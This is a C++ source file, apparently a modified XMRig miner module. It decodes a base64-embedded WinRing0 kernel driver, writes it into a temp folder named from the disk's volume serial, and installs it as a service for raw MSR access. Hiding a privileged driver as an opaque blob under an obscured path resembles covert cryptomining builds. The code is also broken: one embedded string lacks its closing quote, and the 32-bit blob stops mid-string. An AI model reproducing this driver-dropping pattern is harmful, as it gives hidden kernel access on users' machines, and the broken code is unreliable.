/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include "hw/msr/Msr.h"
#include "backend/cpu/Cpu.h"
#include "base/io/log/Log.h"
#include "base/kernel/Platform.h"
#include <base/tools/Base64.h>
#include <base/kernel/Platform.h>


#include <string>
#include <thread>
#include <vector>
#include <windows.h>


#define SERVICE_NAME    L"WinRing0_1_2_0"
#define IOCTL_READ_MSR  CTL_CODE(40000, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_MSR CTL_CODE(40000, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)


namespace xmrig {


static const wchar_t *kServiceName = SERVICE_NAME;


class MsrPrivate
{
public:
    bool uninstall()
    {
        if (driver != INVALID_HANDLE_VALUE) {
            CloseHandle(driver);
        }

        if (!service) {
            return true;
        }

        bool result = true;

        if (!reuse) {
            SERVICE_STATUS serviceStatus;

            if (!ControlService(service, SERVICE_CONTROL_STOP, &serviceStatus)) {
                result = false;
            }

            if (!DeleteService(service)) {
                LOG_ERR("%s " RED("failed to remove WinRing0 driver, error %u"), Msr::tag(), GetLastError());
                result = false;
            }
        }

        CloseServiceHandle(service);
        service = nullptr;

        return result;
    }


    bool reuse          = false;
    HANDLE driver       = INVALID_HANDLE_VALUE;
    SC_HANDLE manager   = nullptr;
    SC_HANDLE service   = nullptr;
};


} // namespace xmrig

BOOL Is64BitWindows();
ULONG PseudoRandom(ULONG* seed);
void GetId(wchar_t *Id);

BOOL Is64BitWindows()
{
    #if defined(_WIN64)
        return TRUE;  // 64-bit programs run only on Win64
    #elif defined(_WIN32)
        // 32-bit programs run on both 32-bit and 64-bit Windows
        // so must sniff
        BOOL f64 = FALSE;
        return IsWow64Process(GetCurrentProcess(), &f64) && f64;
    #else
        return FALSE; // Win64 does not support Win16
    #endif
}

ULONG PseudoRandom(ULONG *seed)
{
    return (*seed = 1242479 * (*seed) + 2349124207);
}

void GetId(wchar_t *Id)
{
    CHAR windowsDirectory[MAX_PATH];
    CHAR volumeName[8] = { 0 };
    DWORD seed = 0;
    
    if(!GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
       windowsDirectory[0] = L'C';
    
    volumeName[0] = windowsDirectory[0];   
    volumeName[1] = ':';
    volumeName[2] = '\\';
    volumeName[3] = '\0';
    
    GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);
    
    GUID guid;
    guid.Data1 =          PseudoRandom(&seed);
    
    guid.Data2 = (USHORT) PseudoRandom(&seed);
    guid.Data3 = (USHORT) PseudoRandom(&seed);
    for(int i = 0; i < 8; i++)
       guid.Data4[i] = (UCHAR) PseudoRandom(&seed);
    
    wsprintfW(Id, L"%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]);
}

xmrig::Msr::Msr() : d_ptr(new MsrPrivate())
{
    DWORD err = 0;

    d_ptr->manager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!d_ptr->manager) {
        if ((err = GetLastError()) == ERROR_ACCESS_DENIED) {
            LOG_WARN("%s " YELLOW_BOLD("to access MSR registers Administrator privileges required."), tag());
        }
        else {
            LOG_ERR("%s " RED("failed to open service control manager, error %u"), tag(), err);
        }

        return;
    }

    std::vector<wchar_t> dir;
    std::vector<wchar_t> _guid;

    _guid.resize(35);
    GetId(_guid.data());

    do {
        dir.resize(dir.empty() ? MAX_PATH : dir.size() * 2);
        GetTempPathW(dir.size(), dir.data());
        err = GetLastError();
    } while (err == ERROR_INSUFFICIENT_BUFFER);

    if (err != ERROR_SUCCESS) {
        LOG_ERR("%s " RED("failed to get path to driver, error %u"), tag(), err);
        return;
    }

     for (auto it = dir.end() - 1; it != dir.begin(); --it) {
         if ((*it == L'\\') || (*it == L'/')) {
             ++it;
             *it = L'\0';
             break;
         }
     }

    std::wstring working_dir = std::wstring(dir.data()) + std::wstring(_guid.data());

    CreateDirectoryW(working_dir.c_str(), NULL);
    const std::wstring path =  working_dir + L"\\WinRing0.sys";

    DWORD attrib = GetFileAttributes(path.data());

    if (attrib == INVALID_FILE_ATTRIBUTES)
    {
        DWORD bytesWritten = 0;
        static const char data64[] =
            "TVqQAAMAAAAEAAAA//"
            "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"
            "AAAAAAAAAAQABAACAAAAAAAAAAAAAAAAAAAAvAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAmAIAAAEAMAA0ADEAMQAwADQAYgAwAAAASgAZAAEAQwBvAG0AbQBlAG4AdABzAAAAVABoAGUAIABtAG8AZABpAGYAaQBlAGQAIABCAFMARAAgAGwAaQBjAGUAbgBzAGUAAAAAAD4ADwABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAATwBwAGUAbgBMAGkAYgBTAHkAcwAuAG8AcgBnAAAAAAA6AAkAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAVwBpAG4AUgBpAG4AZwAwAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAyAC4AMAAuADUAAAA6AA0AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAFcAaQBuAFIAaQBuAGcAMAAuAHMAeQBzAAAAAACeAD0AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADAANwAtADIAMAAwADgAIABPAHAAZQBuAEwAaQBiAFMAeQBzAC4AbwByAGcALgAgAEEAbABsACAAcgBpAGcAaAB0AHMAIAByAGUAcwBlAHIAdgBlAGQALgAAAAAAQgANAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFcAaQBuAFIAaQBuAGcAMAAuAHMAeQBzAAAAAAAyAAkAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFcAaQBuAFIAaQBuAGcAMAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADIALgAwAC4ANQAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBu"
            "";
        static const char data86[] =
            "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEQEAIBABAAIAAABSU0RTu3Mfe2SJEUaqUmyq0vuTCAEAAABkOlxob3Rwcm9qZWN0XHdpbnJpbmcwXHNvdXJjZVxkbGxcc3lzXGxpYlxpMzg2XFdpblJpbmcwLnBkYgAAAAAAoAsAAH8NAAD+////AAAAANj///8AAAAA/v////UEAQD5BAEAAAAAAP7///8AAAAA2P///wAAAAD+////SgUBAE4FAQAAAAAA/v///wAAAADY////AAAAAP7///+jBQEApwUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO5kC7sRm/RAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAi/9Vi+yhABEBAIXAuU7mQLt0BDvBdR6LFSwPAQC4ABEBAMHoCDMCowARAQB1B4vBowARAQD30KMEEQEAXenP+P//"
            "zCgSAAAAAAAAAAAAAHATAAAkDwAABBIAAAAAAAAAAAAAIhQAAAAPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPITAADeEwAAyhMAALYTAACkEwAAkBMAAH4TAAAKFAAAAAAAADgTAAAiEwAAYhMAABITAAD0EgAA1hIAALgSAACmEgAAjhIAAHYSAABQEwAAZBIAACoUAAA2FAAAAAAAACUBSW9EZWxldGVEZXZpY2UAACcBSW9EZWxldGVTeW1ib2xpY0xpbmsAAGgDUnRsSW5pdFVuaWNvZGVTdHJpbmcAAGgCTW1Vbm1hcElvU3BhY2UAAPACUkVBRF9SRUdJU1RFUl9CVUZGRVJfVUNIQVIAAPICUkVBRF9SRUdJU1RFUl9CVUZGRVJfVVNIT1JUAPECUkVBRF9SRUdJU1RFUl9CVUZGRVJfVUxPTkcAAE8CTW1NYXBJb1NwYWNlAACXAUlvZkNvbXBsZXRlUmVxdWVzdAAAIQFJb0NyZWF0ZVN5bWJvbGljTGluawAAGwFJb0NyZWF0ZURldmljZQAADQJLZVRpY2tDb3VudABudG9za3JubC5leGUAAFYAUkVBRF9QT1JUX1VDSEFSAFgAUkVBRF9QT1JUX1VTSE9SVAAAVwBS